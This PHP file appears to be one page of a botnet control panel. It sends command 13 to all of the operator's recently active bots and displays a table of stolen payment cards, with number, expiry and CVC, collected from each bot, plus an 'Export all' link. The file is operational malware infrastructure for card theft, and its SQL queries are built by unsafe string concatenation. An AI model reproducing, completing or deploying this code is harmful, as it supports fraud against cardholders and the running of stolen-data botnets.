<?php
	include "config.php";
	
	if($_GET['op']=="masscall"){
		//echo "asdfasdf";
		
		$par = array();
		$par['status'] = 1;
		
		$sql = "select bid from bots where bot_user_id='".$kernel['userid']."' and bot_last_seen>'".$kernel['time_day']."';";
		$res = $dbm->query($sql);
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				generate_command($row[0],13,json_encode($par),0);
			}
		}
		
		//generate_command($bid,13,json_encode($par),0);
		
		header("Location: list.php");
	}

	print_header();
	
	print_menu();
	
	$html = "
	[<a href=raw.php?query=allcards>Export all</a>] 
	[<a href=cards.php?op=masscall>Request all</a>]
	<hr>
	<table class=\"table\">
    <thead>
      <tr>
        <th>Date</th>
        <th>BID</th>
        <th>Card data</th>
        <th>Country</th>
      </tr>
    </thead>
    <tbody>";
      
	$res = $dbm->query("select * from cards ORDER BY id DESC");
	if($dbm->count>0){
		while($row=mysqli_fetch_array($res)) {
			//$return[] = $row;
			$card = json_decode($row[2]);
			//var_dump($card);
			$c = $card->card.":".$card->month.":".$card->year.":".$card->cvc;
			$html.= "
				<th>".new_time($row[3])."</th>
				<th>".get_link_bot($row[1])."</th>
				<th>$c</th>
				<th></th>
			</tr>
			";			
		}
	}
      
    $html.="</tbody>
  </table>
	";

	print_content("Bot cards",$html);
	
	print_footer();

?>
